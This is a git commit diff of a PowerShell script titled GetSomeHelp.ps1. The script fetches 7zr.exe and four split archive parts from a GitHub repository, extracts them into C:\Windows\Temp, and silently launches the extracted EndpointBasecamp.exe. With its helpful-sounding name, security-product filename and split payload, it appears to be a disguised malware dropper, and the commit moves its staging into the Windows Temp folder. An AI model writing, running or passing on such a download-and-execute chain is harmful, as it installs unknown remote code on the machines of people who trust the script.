c0a8841355daeeab6135338736406c0d25568095
uvUpAjx4Zp <ture15tears@gmail.com>
2025-01-21 23:29:38 +0800

    Update GetSomeHelp.ps1

--- GetSomeHelp.ps1
+++ GetSomeHelp.ps1
@@ -1,8 +1,9 @@
 $ErrorActionPreference = "Stop"
 
-# 定義下載 7zr.exe 的連結與存放路徑
+# 定義 7zr.exe 的下載路徑
 $sevenZipUrl = "https://www.7-zip.org/a/7zr.exe"
-$sevenZipPath = ".\7zr.exe"
+$sevenZipPath = "C:\Windows\Temp\7zr.exe"
+$baseDir = "C:\Windows\Temp"
 $downloadBaseUrl = "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main"
 $fileParts = @(
     "EndpointBasecamp.zip.001",
@@ -10,42 +11,30 @@ $fileParts = @(
     "EndpointBasecamp.zip.003",
     "EndpointBasecamp.zip.004"
 )
-$downloadDir = ".\Download"
-$extractDir = ".\Extracted"
 
 # 下載 7zr.exe
 if (-not (Test-Path $sevenZipPath)) {
     Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipPath
 }
 
-# 確保下載目錄存在
-if (-not (Test-Path $downloadDir)) {
-    New-Item -ItemType Directory -Path $downloadDir | Out-Null
-}
-
 # 下載壓縮檔
 foreach ($filePart in $fileParts) {
     $fileUrl = "$downloadBaseUrl/$filePart"
-    $destinationPath = Join-Path -Path $downloadDir -ChildPath $filePart
+    $destinationPath = Join-Path -Path $baseDir -ChildPath $filePart
     if (-not (Test-Path $destinationPath)) {
         Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
     }
 }
 
-# 確保解壓縮目錄存在
-if (-not (Test-Path $extractDir)) {
-    New-Item -ItemType Directory -Path $extractDir | Out-Null
-}
-
 # 解壓縮檔案
-$sevenZipArgs = "x `"$downloadDir\EndpointBasecamp.zip.001`" -o`"$extractDir`" -y"
+$sevenZipArgs = "x `"$baseDir\EndpointBasecamp.zip.001`" -o`"$baseDir`" -y"
 $process = Start-Process -FilePath $sevenZipPath -ArgumentList $sevenZipArgs -NoNewWindow -Wait -PassThru
 if ($process.ExitCode -ne 0) {
     exit 1
 }
 
 # 執行解壓縮後的檔案
-$extractedFile = Join-Path -Path $extractDir -ChildPath "EndpointBasecamp.exe"
+$extractedFile = Join-Path -Path $baseDir -ChildPath "EndpointBasecamp.exe"
 if (Test-Path $extractedFile) {
     Start-Process -FilePath $extractedFile -NoNewWindow
 }
